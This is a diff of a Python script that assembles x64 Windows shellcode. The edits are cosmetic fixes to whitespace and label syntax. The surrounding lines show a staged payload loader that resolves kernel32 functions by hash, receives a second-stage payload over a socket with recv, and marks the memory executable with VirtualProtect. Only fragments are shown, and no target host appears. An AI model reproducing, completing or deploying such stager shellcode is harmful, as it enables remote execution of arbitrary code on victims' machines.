@@ -35,12 +35,12 @@ def main():
         " get_find_function_ret:            "
         "   jmp find_function_short         ;"  # A short jump to call function backwards
         
-        " find_function_ret:                 "
+        " find_function_ret:                "
         "   pop rsi                         ;"  # Pop ret addr of find_function to RSI
         "   mov [rbp+0x8], rsi              ;"  # Save ret addr of find_function to [rbp+0x8] for later use
         "   jmp resolve_functions_knl32     ;"  # Resolve functions
         
-        " find_function_short:               "
+        " find_function_short:              "
         "   call find_function_ret          ;"  # This will push the ret addr of find_function on stack, we will save that for later use
                
         # Resolving VA for Export Address Table
@@ -92,7 +92,7 @@ def main():
         " function_found:                   "
         "   ret                             ;"
         
-        " resolve_functions_knl32:              "
+        " resolve_functions_knl32:          "
         "   mov r15, 0x78b5b983             ;"  # TerminateProcess hash
         "   call qword ptr [rbp+0x08]       ;"  # Call find_function
         "   mov [rbp+0x18], rax             ;"  # Save TerminateProcess to [rbp+0x18]
@@ -202,7 +202,7 @@ def main():
         "   jnz call_terminate_process      ;"  # If not zero, terminate process
         "   add rsp, 0x120                  ;"  # Cleanup
         
-        " prep_call_recv:                   ;"  # Prepare arguments to call recv, so call_recv can be resued
+        " prep_call_recv:                   "  # Prepare arguments to call recv, so call_recv can be resued
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
         "   mov rbx, rsp                    ;"  # Second arg, buf
         "   xor r12, r12                    ;"  # Clear R12
@@ -221,7 +221,7 @@ def main():
         "   test rsi, rsi                   ;"  # Check if we are recving second stage paylaod
         "   jnz do_loop                     ;"  # If yes, jump to the loop to recv stage 2 payload
         
-        " save_stage_2_size:                ;"
+        " save_stage_2_size:                "
         "   cmp rax, r13                    ;"  # Check if return value is the length we specified
         "   jne call_terminate_process      ;"  # If not, terminate process
         "   mov r14, [rsp+0x20]             ;"  # Move stage 2 size to R14
@@ -270,7 +270,7 @@ def main():
         "   cmp rdi, [rbp+0x60]             ;"  # Compare received bytes to stage 2 size
         "   jl  call_recv                   ;"  # If received bytes < stage 2 size, keep recv data
 
-        " recv_end:                         ;"  # Have received all stage 2 payload
+        " recv_end:                         "  # Have received all stage 2 payload
         "   add rsp, 0x80                   ;"  # Cleanup
         
         " call_virtual_protect:             "   # Change mem protection to RX
